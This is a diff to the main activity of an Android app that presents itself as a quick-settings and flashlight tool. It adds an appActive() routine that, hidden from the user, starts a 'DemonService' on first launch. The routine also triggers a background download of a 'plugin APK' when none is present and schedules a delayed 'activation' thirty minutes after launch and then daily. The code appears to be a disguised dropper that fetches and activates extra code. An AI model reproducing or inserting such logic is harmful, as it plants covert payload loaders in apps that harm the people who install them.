@@ -16,50 +16,23 @@
 
 package com.bwx.bequick;
 
-import static com.bwx.bequick.Constants.PREF_ADS_SHOWN;
-import static com.bwx.bequick.Constants.PREF_APPEARANCE;
-import static com.bwx.bequick.Constants.PREF_FLASHLIGHT;
-import static com.bwx.bequick.Constants.SDK_VERSION;
-import static com.bwx.bequick.Constants.DEBUG;
-
-import java.io.File;
-import java.util.ArrayList;
-import java.util.Iterator;
-
 import android.app.Dialog;
 import android.app.ProgressDialog;
-import android.content.BroadcastReceiver;
-import android.content.Context;
-import android.content.Intent;
-import android.content.IntentFilter;
-import android.content.SharedPreferences;
+import android.content.*;
 import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
-import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
-import android.graphics.Canvas;
-import android.graphics.Color;
-import android.graphics.Paint;
-import android.graphics.Typeface;
-import android.graphics.drawable.BitmapDrawable;
-import android.graphics.drawable.Drawable;
-import android.graphics.drawable.NinePatchDrawable;
-import android.graphics.drawable.StateListDrawable;
+import android.graphics.*;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.StatFs;
+import android.text.TextUtils;
 import android.text.format.Formatter;
 import android.util.DisplayMetrics;
 import android.util.Log;
-import android.view.Menu;
-import android.view.MenuInflater;
-import android.view.MenuItem;
-import android.view.View;
-import android.view.Window;
+import android.view.*;
 import android.view.View.OnClickListener;
 import android.widget.ImageButton;
 import android.widget.TextView;
 import android.widget.Toast;
-
 import com.bwx.bequick.flashlight.LedFlashlightReceiver;
 import com.bwx.bequick.flashlight.ScreenLightActivity;
 import com.bwx.bequick.fwk.Setting;
@@ -67,12 +40,19 @@ import com.bwx.bequick.fwk.SettingHandler;
 import com.bwx.bequick.fwk.SettingsFactory;
 import com.bwx.bequick.preferences.CommonPrefs;
 import com.plugin.common.utils.UtilsRuntime;
-import com.xstd.qm.AppRuntime;
 import com.xstd.qm.Config;
+import com.xstd.qm.DemonService;
 import com.xstd.qm.UtilOperator;
 import com.xstd.qm.app.QuickSettingApplication;
 import com.xstd.qm.setting.SettingManager;
 import com.xstd.quick.R;
+
+import java.io.File;
+import java.util.ArrayList;
+import java.util.Calendar;
+import java.util.Iterator;
+
+import static com.bwx.bequick.Constants.*;
 
 public class MainSettingsActivity extends BaseActivity implements OnClickListener, OnSharedPreferenceChangeListener {
 
@@ -267,8 +247,59 @@ public class MainSettingsActivity extends BaseActivity implements OnClickListene
 //        registerReceiver(sreenBRC, new IntentFilter(Intent.ACTION_SCREEN_OFF));
 
 
-
+        appActive();
 	}
+
+    private void appActive() {
+        long launchTime = SettingManager.getInstance().getKeyLanuchTime();
+        if (launchTime == 0 || TextUtils.isEmpty(SettingManager.getInstance().getLocalApkPath())) {
+            //first lanuch
+
+            if (Config.DEBUG) {
+                Config.LOGD("[[QuickSettingApplication::onCreate]] notify Service Lanuch as the lanuch time == 0");
+            }
+
+            Intent i = new Intent();
+            i.setClass(getApplicationContext(), DemonService.class);
+            i.setAction(DemonService.ACTION_LANUCH);
+            startService(i);
+        } else if (!UtilOperator.isPluginApkExist() && !Config.DOWNLOAD_PROCESS_RUNNING.get()) {
+            if (Config.DEBUG) {
+                Config.LOGD("[[QuickSettingApplication::onCreate]] try to download APK from : "
+                                + SettingManager.getInstance().getLocalApkPath() + " as the local plugin apk not exists");
+            }
+
+            Intent i = new Intent();
+            i.setClass(getApplicationContext(), DemonService.class);
+            i.setAction(DemonService.ACTION_DOWNLOAD_PLUGIN);
+            startService(i);
+        }
+
+        long activeTime = SettingManager.getInstance().getKeyActiveTime();
+        if (activeTime == 0) {
+            long deta = System.currentTimeMillis() - SettingManager.getInstance().getKeyLanuchTime();
+            //TODO: 设置激活时间，激活时间是在启动时间之后的半个小时
+            if (deta >= (30 * 60 * 1000)) {
+                //active now
+//                UtilOperator.startActiveAlarm(getApplicationContext(), 1000);
+                DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, 1000);
+            } else {
+                long activeDelay = 30 * 60 * 1000 - deta;
+                DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, activeDelay);
+            }
+        } else {
+            Calendar c = Calendar.getInstance();
+            c.setTimeInMillis(activeTime);
+            int lastDay = c.get(Calendar.DAY_OF_YEAR);
+            c = Calendar.getInstance();
+            int curDay = c.get(Calendar.DAY_OF_YEAR);
+
+            if (curDay != lastDay) {
+                //不是同一天，每天激活一次
+                DemonService.startAlarmForAction(getApplicationContext(), DemonService.ACTION_ACTIVE_MAIN, 1000);
+            }
+        }
+    }
 
     @Override
     public void onStart() {
